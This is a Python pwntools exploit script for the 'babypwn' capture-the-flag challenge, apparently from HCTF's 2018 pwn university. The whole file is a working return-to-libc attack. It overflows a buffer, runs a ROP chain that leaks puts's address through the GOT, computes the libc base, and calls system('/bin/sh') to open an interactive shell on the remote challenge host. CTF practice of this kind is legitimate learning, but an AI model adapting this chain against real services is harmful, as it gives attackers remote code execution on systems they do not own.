from pwn import *



#LD_LIBRARY_PATH=/home/vagrant/pwn/pwn_unversity2018/babypwn/libc.so.6 ./babypwn

HOST = "baby.uni.hctf.fun"
PORT = 25251
def fuzz(f):

	return cyclic(f)

#strings -a -t x libc.so.6 | grep /bin/
##readelf -s libc.so.6 | grep system

def exploit(r):

    #b *0x401166
    #f = fuzz(500)
    rbp = cyclic_find('haabiaab')

    poprdi = p64(0x0000000000401203) #libc
    puts_plt = p64(0x401030)
    puts_got = p64(0x0000000000403fc8)# got 
    main = p64(0x401169)
    #main = p64(libc.sym['__libc_start_main'])
    r.sendline("A" * rbp + "C" * 8 + poprdi + puts_got + puts_plt + main)

    r.recvline("Welcome student! Can you run /bin/sh")
    data = r.recv(6)

    data += "\x00" *(8 - len(data))
    leak = u64(data)
    libc_address = leak - libc.sym['puts']
    system = libc_address + libc.symbols['system']
    sh = libc_address + next(libc.search('/bin/sh'))
    log.info("[+] libc.address : " + hex(leak))
    log.info("[+] system : " + hex(system))
    log.info("[+] /bin/sh : " + hex(sh))

    r.sendline("A" * rbp + "C" * 8  + poprdi + p64(sh)+ p64(system) + "\x90"*8)

    r.interactive()
if __name__ == '__main__':

    if(len(sys.argv) > 1):

        r = remote(HOST,PORT)
        libc = ELF("/home/vagrant/pwn/pwn_university2018/babypwn/libc.so.6")
    
        exploit(r)
    else:
        file = 'babypwn'
        binary = os.getcwd() + '/' + str(file)
        #libc = ELF("/home/vagrant/pwn/pwn_university2018/babypwn/libc.so.6")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        r = process(binary)
        print(util.proc.pidof(r))
        pause()
        exploit(r)


